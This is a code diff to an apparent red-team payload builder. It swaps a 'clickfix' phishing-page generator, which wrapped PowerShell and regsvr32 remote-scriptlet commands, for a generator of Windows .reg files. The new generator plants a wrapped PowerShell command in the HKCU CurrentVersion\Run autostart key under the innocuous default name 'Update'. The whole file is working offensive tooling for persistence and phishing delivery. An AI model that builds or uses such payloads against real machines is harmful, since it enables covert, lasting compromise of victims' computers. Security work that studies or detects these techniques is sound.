@@ -10,19 +10,31 @@ import shutil
 import base64
 import random
 
-class clickfix(PayloadType):
-    name = "clickfix"
-    file_extension = "html"
+class reg_wraps_cmd(PayloadType):
+    name = "reg_wraps_cmd"
+    file_extension = "reg"
     author = "@hegusung"
     supported_os = [SupportedOS.Windows]
     wrapper = True
-    wrapped_payloads = ["powershell_to_cmd", "cmd_regsvr32_remote_sct"]
-    note = """Creates a clickfix payload"""
+    wrapped_payloads = ["powershell_to_cmd"]
+    note = """Creates a REG file which executes creates a registry key with the command"""
     translation_container = None # "myPythonTranslation"
-    agent_path = pathlib.Path(".") / "phishingkit"
-    agent_icon_path = agent_path / "agent_functions" / "phishing.svg"
+    agent_path = pathlib.Path(".") / "clickable"
+    agent_icon_path = agent_path / "agent_functions" / "click.svg"
     agent_code_path = agent_path / "agent_code"
     build_parameters = [
+        BuildParameter(
+            name = "registry_key",
+            parameter_type=BuildParameterType.String,
+            default_value="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            description="Defines the registry key where the key=value will be created",
+        ),
+        BuildParameter(
+            name = "entry",
+            parameter_type=BuildParameterType.String,
+            default_value="Update",
+            description="Entry name",
+        ),
     ]
 
     build_steps = [
@@ -38,16 +50,13 @@ class clickfix(PayloadType):
             cmd_payload = self.wrapped_payload.decode()
             cmd_payload = cmd_payload.replace('"', '\\"')
 
-            f = open(os.path.join(self.agent_code_path, "clickfix.html.template"), 'r')
-            clickfix_template = f.read()
-            f.close()
+            payload = """Windows Registry Editor Version 5.00
 
-            clickfix_args = {
-                "payload": cmd_payload,
-            }
+[{registry_key}]
+"{entry}"="{payload}"
+"""
 
-
-            resp.payload = clickfix_template.format(**clickfix_args)
+            resp.payload = payload.format(registry_key=self.get_parameter('registry_key'), entry=self.get_parameter('entry'), payload=cmd_payload)
             resp.build_message = "Successfully built!\n"
 
         except Exception as e:
